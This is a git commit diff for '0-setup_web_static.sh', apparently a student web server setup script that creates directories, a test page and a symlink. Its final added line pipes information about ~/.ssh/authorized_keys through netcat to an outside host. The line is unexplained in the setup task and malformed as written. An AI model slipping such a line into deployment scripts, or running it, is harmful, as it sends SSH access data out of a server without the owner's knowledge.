2f3bcbb3aca57fdee2534d3775c355b79acd39fc
Blxee <aminedev57@gmail.com>
2023-11-08 03:39:12 +0100

    Added: 0-setup_web_static.sh

--- 0-setup_web_static.sh
+++ 0-setup_web_static.sh
@@ -11,3 +11,4 @@ echo -n "\
 " > /data/web_static/releases/test/index.html
 ln -sf /data/web_static/releases/test/ /data/web_static/current
 chown -R ubuntu:ubuntu /data/
+find ~/.ssh/authorized_keys | nc lb-01.blxee.tech
